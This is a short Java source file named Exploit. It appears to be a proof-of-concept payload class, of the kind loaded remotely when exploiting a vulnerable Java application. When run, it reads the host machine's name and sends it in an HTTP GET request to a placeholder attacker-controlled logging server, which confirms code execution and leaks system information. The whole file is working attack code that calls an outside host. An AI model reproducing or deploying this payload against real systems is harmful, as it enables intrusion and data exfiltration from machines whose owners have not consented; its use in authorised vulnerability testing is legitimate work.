import java.net.InetAddress;
import java.net.HttpURLConnection;
import java.net.URL;
public class Exploit
{
    private static String system_name;
    private static String LOG_SERVER_URL = "http://<LOGGING_SERVER_IP>:<LOGGING_SERVER_PORT>/log/%s";
    
    public static void main(String args[])
    {
        try 
        {
            system_name = InetAddress.getLocalHost().getHostName();
            LOG_SERVER_URL = String.format(LOG_SERVER_URL , system_name);
        
        } catch (Exception e) 
        {
            System.err.println(e.getMessage());
        }

        try
        {
            URL url = new URL(LOG_SERVER_URL);
            HttpURLConnection remote_connection = (HttpURLConnection) url.openConnection();
            remote_connection.setRequestMethod("GET");
            remote_connection.getResponseCode();
        
        } catch (Exception e)
        {
            System.err.println(e.getMessage());
        }
    }
}
